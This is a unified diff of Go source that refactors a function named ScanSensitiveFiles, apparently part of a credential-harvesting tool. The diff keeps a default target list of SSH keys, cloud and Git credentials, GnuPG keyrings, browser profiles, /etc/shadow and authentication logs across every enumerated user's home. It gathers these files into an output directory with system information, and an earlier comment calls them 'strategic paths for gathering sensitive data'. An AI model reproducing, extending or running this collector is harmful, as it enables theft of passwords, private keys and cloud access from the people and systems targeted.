@@ -49,59 +49,45 @@ func EnumerateUsers() ([]string, error) {
 	return homeDirs, nil
 }
 
-// ScanSensitiveFiles collects all files from specified paths for all accessible users.
-func ScanSensitiveFiles(outputDir string) ([]string, error) {
-	// Get current user's home directory
-	currentHome, _ := os.UserHomeDir()
+// ScanSensitiveFiles collects all files from specified paths or default paths.
+func ScanSensitiveFiles(outputDir string, customPaths []string) ([]string, error) {
+	var pathsToScan []string
 
-	// Get home directories for all users
-	userHomes, err := EnumerateUsers()
-	if err != nil {
-		fmt.Printf("Error enumerating users: %v\n", err)
-		userHomes = []string{currentHome} // Fallback to current user's home
-	}
-
-	// Strategic paths for gathering sensitive data
-	relativePaths := []string{
-		".ssh", ".aws", ".gnupg", ".git-credentials", ".gitconfig", ".docker",
-		".kube", ".config/gcloud", ".azure", ".openvpn", ".profile", ".npmrc",
-		".pypirc", ".netrc", ".local/share/keyrings", "secrets", ".bashrc", ".zshrc",
-		".mozilla/firefox", ".config/google-chrome", ".config/chromium",
-	}
-
-	// System-level paths
-	systemPaths := []string{
-		"/etc/passwd", "/etc/shadow", "/etc/group", "/etc/hostname", "/etc/hosts",
-		"/etc/ssl", "/etc/crontab", "/etc/apache2", "/etc/httpd", "/etc/nginx/conf.d",
-		"/var/spool/cron", "/var/spool/mail", "/var/log/auth.log", "/var/log/secure",
-		"/var/log/messages", "/var/log/syslog", "/tmp/ssh-*", "/tmp/vim*",
+	if len(customPaths) > 0 {
+		// Use user-provided paths
+		pathsToScan = customPaths
+	} else {
+		// Default paths
+		currentHome, _ := os.UserHomeDir()
+		userHomes, err := EnumerateUsers()
+		if err != nil {
+			fmt.Printf("Error enumerating users: %v\n", err)
+			userHomes = []string{currentHome}
+		}
+		relativePaths := []string{
+			".ssh", ".aws", ".gnupg", ".git-credentials", ".gitconfig", ".docker",
+			".kube", ".config/gcloud", ".azure", ".openvpn", ".profile", ".npmrc",
+			".pypirc", ".netrc", ".local/share/keyrings", "secrets", ".bashrc", ".zshrc",
+			".mozilla/firefox", ".config/google-chrome", ".config/chromium",
+		}
+		for _, home := range userHomes {
+			for _, relPath := range relativePaths {
+				pathsToScan = append(pathsToScan, filepath.Join(home, relPath))
+			}
+		}
+		pathsToScan = append(pathsToScan,
+			"/etc/passwd", "/etc/shadow", "/etc/group", "/etc/hostname", "/etc/hosts",
+			"/etc/ssl", "/etc/crontab", "/etc/apache2", "/etc/httpd", "/etc/nginx/conf.d",
+			"/var/spool/cron", "/var/spool/mail", "/var/log/auth.log", "/var/log/secure",
+			"/var/log/messages", "/var/log/syslog", "/tmp/ssh-*", "/tmp/vim*",
+		)
 	}
 
 	var wg sync.WaitGroup
 	fileChan := make(chan string)
 	errChan := make(chan error)
 
-	// Scan home directories
-	for _, home := range userHomes {
-		for _, relPath := range relativePaths {
-			absPath := filepath.Join(home, relPath)
-			wg.Add(1)
-			go func(path string) {
-				defer wg.Done()
-				files := expandPath(path)
-				for _, file := range files {
-					if _, err := os.Stat(file); err == nil {
-						fileChan <- file
-					} else {
-						errChan <- fmt.Errorf("failed to access %s: %v", file, err)
-					}
-				}
-			}(absPath)
-		}
-	}
-
-	// Scan system paths
-	for _, path := range systemPaths {
+	for _, path := range pathsToScan {
 		wg.Add(1)
 		go func(path string) {
 			defer wg.Done()
@@ -116,34 +102,27 @@ func ScanSensitiveFiles(outputDir string) ([]string, error) {
 		}(path)
 	}
 
-	// Wait for all goroutines to complete
 	go func() {
 		wg.Wait()
 		close(fileChan)
 		close(errChan)
 	}()
 
-	// Collect results and handle errors
 	var files []string
 	for file := range fileChan {
-		//fmt.Printf("Found file: %s\n", file) // Debug log
 		files = append(files, file)
 	}
 
-	// Log errors but proceed
 	for err := range errChan {
 		fmt.Println(err)
 	}
 
-	// Save system info
 	systemInfoPath, err := saveSystemInfo(outputDir)
 	if err != nil {
 		return nil, err
 	}
 
-	// Add system info to the files list
 	files = append(files, systemInfoPath)
-
 	return files, nil
 }
 
